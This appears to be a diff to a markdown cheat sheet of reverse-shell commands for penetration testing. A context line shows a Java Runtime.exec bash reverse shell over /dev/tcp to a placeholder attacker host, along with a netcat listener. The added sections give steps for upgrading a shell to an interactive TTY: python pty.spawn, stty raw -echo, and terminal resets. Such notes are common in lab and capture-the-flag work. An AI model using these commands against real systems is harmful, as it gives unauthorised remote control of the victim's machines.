@@ -42,3 +42,19 @@ r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<lhost>/
 rlwramp nc -nlvp <port>
 ```
 
+## interactive reverse shell - and Ctrl+Z (1) 
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## interactive reverse shell - on host - and do fg (2)
+```
+stty raw -echo
+```
+
+## interactive reverse shell - on reverse (3)
+```
+reset
+stty rows <ROWS> cols <COLS>
+export TERM=xterm-256color
+```
